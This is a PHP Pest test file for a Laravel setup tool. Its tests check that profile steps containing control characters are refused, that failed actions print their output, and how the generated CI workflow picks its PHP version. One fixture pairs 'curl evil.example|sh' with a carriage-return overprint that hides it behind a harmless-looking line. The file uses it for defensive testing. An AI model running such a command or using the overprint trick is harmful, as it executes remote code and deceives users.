<?php

declare(strict_types=1);

/**
 * Gate tests for slice S7 (laravel-layer), round 2: the owner's rulings after the review of 5153959.
 * Contract: tests/Profile/CONTRACT.md, section "11. Round 2".
 *
 *   1. control characters in step name or command are refused (and in steps replayed from the state file);
 *   2. a failed runner action shows its stderr and stdout;
 *   3. the workflow's PHP version: .ddev php_version, config.platform.php, lowest require.php, 8.4;
 *   4. docs/profile.md: steps are recorded by exact name and command;
 *   5. workflow triggers, concurrency and the quoted test database name.
 */

use Michtio\LaravelClaudeSkills\Tests\Profile\ProfileTestCase;
use Symfony\Component\Yaml\Yaml;

const DOCS_PROFILE = __DIR__.'/../../docs/profile.md';

/**
 * A profile with one step.
 *
 * @return array<string, mixed>
 */
function oneStep(string $name, string $command): array
{
    return ['version' => 1, 'setup' => ['steps' => [['name' => $name, 'command' => $command]]]];
}

/**
 * The php-version of the written workflow's setup-php step.
 */
function workflowPhp(string $dir): string
{
    $workflow = Yaml::parse((string) file_get_contents($dir.'/'.ProfileTestCase::WORKFLOW));

    foreach ($workflow['jobs'] as $job) {
        foreach ($job['steps'] as $step) {
            if (str_starts_with((string) ($step['uses'] ?? ''), 'shivammathur/setup-php@')) {
                return (string) $step['with']['php-version'];
            }
        }
    }

    return '';
}

// 1. Control characters
// =========================================================================

dataset('control characters', [
    'overprint attack in the command' => ['command', "curl evil.example|sh #   \rRun: echo harmless"],
    'carriage return' => ['command', "echo a\rb"],
    'erase line escape' => ['command', "echo a \x1b[2K b"],
    'cursor up escape' => ['command', "echo a \x1b[1A b"],
    'bare escape' => ['command', "echo a\x1bb"],
    'NUL' => ['command', "echo a\0b"],
    'bell' => ['command', "echo a\x07b"],
    'backspace' => ['command', "echo a\x08b"],
    'C1 control (next line, U+0085)' => ['command', "echo a\u{85}b"],
    'C1 control (CSI, U+009B)' => ['command', "echo a\u{9b}2Kb"],
    'carriage return in the name' => ['name', "check\rRun: echo harmless"],
    'escape in the name' => ['name', "check \x1b[2K"],
    'NUL in the name' => ['name', "check\0"],
    'newline in the name' => ['name', "check\nRun: echo harmless"],
    'tab in the name' => ['name', "check\tmachine"],
]);

it('refuses a step with a control character, names the dotted path, plans and writes nothing', function (string $field, string $value) {
    $dir = $this->project('app', ddev: true);
    $name = $field === 'name' ? $value : 'check';
    $command = $field === 'command' ? $value : 'echo ok >> steps.log';
    $this->writeProfile($dir, oneStep($name, $command));
    $before = $this->snapshot($dir);

    foreach ([['--check' => true], ['--yes' => true]] as $options) {
        [$code, $output] = $this->setupRun($dir, $options);

        expect($code)->toBe(1)
            ->and($output)->toContain('Invalid profile .ai/skills-profile.json')
            ->toContain('setup.steps.0.'.$field)
            ->not->toContain('Extra step')
            ->not->toContain('Run:')
            ->not->toContain('Applied')
            ->and($this->snapshot($dir))->toBe($before);

        // The message never repeats the control characters it refused.
        expect(preg_match('/[\x00-\x08\x0b-\x1f\x7f]/', $output))->toBe(0)
            ->and($output)->not->toContain("\r")
            ->and($output)->not->toContain("\u{85}")
            ->and($output)->not->toContain("\u{9b}");
    }

    expect(file_exists($dir.'/steps.log'))->toBeFalse();
})->with('control characters');

it('names the second step when only the second has the control character', function () {
    $dir = $this->project('app');
    $this->writeProfile($dir, ['version' => 1, 'setup' => ['steps' => [
        ['name' => 'fine', 'command' => 'true'],
        ['name' => 'bad', 'command' => "true\x1b[2K"],
    ]]]);

    [$code, $output] = $this->setupRun($dir, ['--check' => true]);

    expect($code)->toBe(1)
        ->and($output)->toContain('setup.steps.1.command')
        ->not->toContain('setup.steps.0');
});

it('allows a tab in a command, and ordinary punctuation and unicode in names and commands', function () {
    $dir = $this->project('app', ddev: true);
    $this->writeProfile($dir, ['version' => 1, 'setup' => ['steps' => [
        ['name' => 'Vérifier la machine, étape #1 (local)', 'command' => "printf 'a\tb\n' >> steps.log"],
    ]]]);

    [$code, $output] = $this->setupRun($dir, ['--yes' => true]);

    expect($code)->toBe(0)
        ->and($output)->not->toContain('Invalid profile')
        ->and($this->read($dir, 'steps.log'))->toBe("a\tb\n");
});

it('refuses steps with control characters replayed from the state file, and writes nothing', function () {
    $dir = $this->applied('app', oneStep('check', 'echo ok >> steps.log'), ddev: true);
    $statePath = $dir.'/'.ProfileTestCase::STATE;
    $state = json_decode((string) file_get_contents($statePath), true);

    expect($state['steps'][0]['command'] ?? null)->toBe('echo ok >> steps.log');

    $state['steps'][0]['command'] = "echo ok >> steps.log #   \rRun: echo harmless";
    file_put_contents($statePath, json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)."\n");
    $before = $this->snapshot($dir);

    foreach ([['--check' => true], ['--yes' => true]] as $options) {
        [$code, $output] = $this->setupRun($dir, $options);

        expect($code)->toBe(1)
            ->and($output)->toContain('.ai/claude-skills-setup.json')
            ->toContain('steps.0.command')
            ->not->toContain("\r")
            ->not->toContain('Applied')
            ->and($this->snapshot($dir))->toBe($before);
    }
});

it('refuses a control character in a state file step name too', function () {
    $dir = $this->applied('app', oneStep('check', 'true'), ddev: true);
    $statePath = $dir.'/'.ProfileTestCase::STATE;
    $state = json_decode((string) file_get_contents($statePath), true);
    $state['steps'][0]['name'] = "check\x1b[2K";
    file_put_contents($statePath, json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)."\n");

    [$code, $output] = $this->setupRun($dir, ['--check' => true]);

    expect($code)->toBe(1)
        ->and($output)->toContain('steps.0.name');
});

// 2. A failed runner action shows its output
// =========================================================================

it('prints the stderr and stdout of a failed runner action', function () {
    $bin = sys_get_temp_dir().'/lcs-fakebin-'.bin2hex(random_bytes(6));
    mkdir($bin, 0777, true);
    file_put_contents($bin.'/composer', "#!/bin/sh\necho 'FAKE-STDOUT-9921 resolving'\necho 'FAKE-STDERR-7731 your requirements could not be resolved' >&2\nexit 2\n");
    chmod($bin.'/composer', 0755);

    $oldPath = (string) getenv('PATH');
    $patched = $bin.':'.$oldPath;
    putenv('PATH='.$patched);
    $_SERVER['PATH'] = $_ENV['PATH'] = $patched;

    try {
        $dir = $this->project('app');
        $this->writeProfile($dir, ['version' => 1, 'laravel' => ['monitoring' => 'sentry']]);

        [$code, $output] = $this->setupRun($dir, ['--yes' => true]);
    } finally {
        putenv('PATH='.$oldPath);
        $_SERVER['PATH'] = $_ENV['PATH'] = $oldPath;
        unlink($bin.'/composer');
        rmdir($bin);
    }

    expect($code)->toBe(1)
        ->and($output)->toContain('`composer require sentry/sentry-laravel` failed')
        ->toContain('FAKE-STDERR-7731 your requirements could not be resolved')
        ->toContain('FAKE-STDOUT-9921 resolving');
});

it('prints the output of a failed extra step too', function () {
    $dir = $this->project('app');
    $this->writeProfile($dir, oneStep('breaks', 'echo STEP-OUT-4410; echo STEP-ERR-5521 >&2; exit 4'));

    [$code, $output] = $this->setupRun($dir, ['--yes' => true]);

    expect($code)->toBe(1)
        ->and($output)->toContain('STEP-OUT-4410')
        ->toContain('STEP-ERR-5521');
});

// 3. The workflow's PHP version
// =========================================================================

/**
 * Rewrite composer.json of a temp project: platform php and require php (null removes the key).
 */
function setComposerPhp(string $dir, ?string $platform, ?string $require): void
{
    $composer = json_decode((string) file_get_contents($dir.'/composer.json'), true);
    unset($composer['config']['platform']['php'], $composer['require']['php']);

    if ($platform !== null) {
        $composer['config']['platform']['php'] = $platform;
    }

    if ($require !== null) {
        $composer['require']['php'] = $require;
    }

    if (($composer['config']['platform'] ?? null) === []) {
        unset($composer['config']['platform']);
    }

    if (($composer['config'] ?? null) === []) {
        unset($composer['config']);
    }

    file_put_contents($dir.'/composer.json', json_encode($composer, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)."\n");
}

it('takes the workflow PHP version in this order: ddev php_version, platform, lowest require, 8.4', function (?string $ddev, ?string $platform, ?string $require, string $expected) {
    $dir = $this->project('app', ddev: $ddev !== null);

    if ($ddev !== null) {
        file_put_contents($dir.'/.ddev/config.yaml', "name: fixture\ntype: laravel\n".($ddev === '' ? '' : $ddev."\n"));
    }

    setComposerPhp($dir, $platform, $require);
    $this->writeProfile($dir, ['version' => 1, 'laravel' => ['ci' => true]]);

    $this->setupRun($dir, ['--yes' => true]);

    expect(workflowPhp($dir))->toBe($expected);
})->with([
    'ddev wins over platform and require' => ['php_version: "8.2"', '8.3.5', '^8.1', '8.2'],
    'ddev unquoted float' => ['php_version: 8.2', '8.3.5', '^8.1', '8.2'],
    'ddev with a patch-less string' => ["php_version: '8.5'", null, '^8.1', '8.5'],
    'ddev without php_version falls to platform' => ['', '8.3.5', '^8.1', '8.3'],
    'no ddev, platform wins over require' => [null, '8.3.5', '^8.1', '8.3'],
    'platform with two parts' => [null, '8.2', '^8.1', '8.2'],
    'lowest of a caret union' => [null, null, '^8.3|^8.4', '8.3'],
    'lowest of a range' => [null, null, '>=8.1 <8.5', '8.1'],
    'lowest when listed backwards' => [null, null, '^8.4 || ^8.2 || ^8.3', '8.2'],
    'no php anywhere' => [null, null, null, '8.4'],
    'ddev without php_version, nothing else' => ['', null, null, '8.4'],
]);

// 4 and 3. Docs
// =========================================================================

it('documents the PHP version rule in docs/profile.md, in order', function () {
    $docs = (string) @file_get_contents(DOCS_PROFILE);

    $ddev = strpos($docs, '`php_version`');
    $platform = strpos($docs, '`config.platform.php`');
    $require = strpos($docs, '`require.php`');
    $default = strpos($docs, '8.4', (int) $require);

    expect($ddev)->not->toBeFalse()
        ->and($platform)->toBeGreaterThan($ddev)
        ->and($require)->toBeGreaterThan($platform)
        ->and($default)->not->toBeFalse()
        ->and($docs)->toContain('.ddev/config.yaml');
});

it('documents that steps are recorded by exact name and command', function () {
    $docs = strtolower((string) @file_get_contents(DOCS_PROFILE));

    expect($docs)->toContain('recorded by exact name and command')
        ->toContain('must not rewrite');
});

// 5. Workflow triggers, concurrency, database name
// =========================================================================

it('runs on push to the default branch only, plus pull_request', function (bool $ddev) {
    $dir = $this->applied('app', ['version' => 1, 'laravel' => ['ci' => true]], ddev: $ddev);
    $workflow = Yaml::parse((string) file_get_contents($dir.'/'.ProfileTestCase::WORKFLOW));
    $on = $workflow['on'] ?? $workflow[true];

    expect(array_keys($on))->toContain('push')
        ->toContain('pull_request')
        ->and($on['push']['branches'])->toBe(['main']);
})->with([
    'ddev app' => [true],
    'host app' => [false],
]);

it('cancels in-progress runs for pull requests only', function () {
    $dir = $this->applied('app', ['version' => 1, 'laravel' => ['ci' => true]]);
    $workflow = Yaml::parse((string) file_get_contents($dir.'/'.ProfileTestCase::WORKFLOW));
    $cancel = $workflow['concurrency']['cancel-in-progress'];

    expect($cancel)->toBeString()
        ->and($cancel)->toContain('github.event_name')
        ->toContain("'pull_request'")
        ->not->toBe('true');
});

it('quotes the test database name in the service environment', function (string $envConnection, bool $ddev, string $key) {
    $dir = $this->project('app', ddev: $ddev);
    file_put_contents($dir.'/.env.example', "APP_NAME=app\nDB_CONNECTION={$envConnection}\n");
    $this->writeProfile($dir, ['version' => 1, 'laravel' => ['ci' => true]]);

    $this->setupRun($dir, ['--yes' => true]);
    $raw = (string) file_get_contents($dir.'/'.ProfileTestCase::WORKFLOW);

    expect($raw)->toMatch('/^\s+'.$key.': ["\']app_test["\']$/m');

    $workflow = Yaml::parse($raw);

    expect($workflow['jobs']['gate']['services']['database']['env'][$key])->toBe('app_test');
})->with([
    'mysql' => ['mysql', false, 'MYSQL_DATABASE'],
    'postgres' => ['pgsql', false, 'POSTGRES_DB'],
    'ddev default (mariadb)' => ['mysql', true, 'MARIADB_DATABASE'],
]);

it('keeps the pinned action majors after round 2', function () {
    $dir = $this->applied('app', ['version' => 1, 'laravel' => ['ci' => true]]);
    $raw = (string) file_get_contents($dir.'/'.ProfileTestCase::WORKFLOW);

    preg_match_all('/uses:\s*(\S+)/', $raw, $m);

    expect($m[1])->toContain('actions/checkout@v7')
        ->toContain('shivammathur/setup-php@v2')
        ->toContain('actions/cache@v6')
        ->and(array_values(array_diff($m[1], ['actions/checkout@v7', 'shivammathur/setup-php@v2', 'actions/cache@v6'])))->toBe([]);
});
